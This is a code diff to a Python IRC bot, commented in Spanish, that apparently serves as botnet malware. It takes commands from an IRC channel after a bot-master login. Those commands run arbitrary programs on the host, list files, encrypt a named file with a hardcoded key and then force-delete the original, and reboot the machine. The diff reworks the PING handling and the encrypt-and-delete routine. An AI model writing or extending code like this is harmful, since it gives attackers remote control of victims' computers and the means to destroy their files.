@@ -134,11 +134,11 @@ def do_command(irc, ircmsg):
     global isAuth
 
     #Comando permitidos sin autenticacion
+    if ircmsg.find("PING") != -1 :
+	        send_msg(irc, canal, "PONG\n\r")
+    
     if not isAuth:
-        if ircmsg.find("Hola") != -1:
-                send_msg(irc, canal, "Hola!!!")
-
-        elif ircmsg.find("!@login") != -1:
+        if ircmsg.find("!@login") != -1:
                 command_rec = ircmsg.split("!@login ")[1]
                 isAuth = isBotMaster(command_rec)
                 if isAuth:
@@ -152,7 +152,7 @@ def do_command(irc, ircmsg):
             command_rec.append("&")
             sub_stdout, sub_stderr = Popen(command_rec, stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
             #send_msg(irc, canal, sub_stdout.replace("\r\n", ", "))
-            send_msg(irc, canal, "Hecho!")
+            send_msg(irc, canal, "Hecho!\n\r")
         
         elif ircmsg.find("!@ls") != -1:
             sub_stdout, sub_stderr = Popen(["ls"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
@@ -169,14 +169,15 @@ def do_command(irc, ircmsg):
 
         elif ircmsg.find("!@cifraArchivo") != -1:
             command_rec = ircmsg.split("!@cifraArchivo ")[1]
-            command_rec = command_rec.split(" ")
+            #command_rec = command_rec.split(" ")
             send_msg(irc, canal, "Cifrando...")
-            fileA=command_rec[0]
+            fileA=command_rec
             if os.path.exists(fileA):
-                sub_stdout, sub_stderr = Popen(["message.exe"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
+                #sub_stdout, sub_stderr = Popen(["C:\Users\malware\Documents\Scana\message.exe"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
                 llave = CreaLlave('hola')
-                mensaje = Cifra(llave,fileA)
-                os.system("del /F /Q /A "+ fileA)
+                Cifra(llave,fileA)
+                mensaje = "Cifrado exitoso!"
+                os.system("del /F /Q /A \""+ fileA + "\"")
                 send_msg(irc, canal, mensaje)
             else:
 		        send_msg(irc, canal, "No existe el archivo.")
@@ -194,8 +195,7 @@ def do_command(irc, ircmsg):
         elif ircmsg.find("!@reboot") != -1 :
             send_msg(irc, "Regreso en un minuto, voy al banio :O")
             sub_stdout, sub_stderr = Popen(["shutdown", "/r", "/t", "0"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
-        elif ircmsg.find("PING") != -1 :
-	        send_msg(irc, canal, "PONG\n\r")
+        
       
 
 
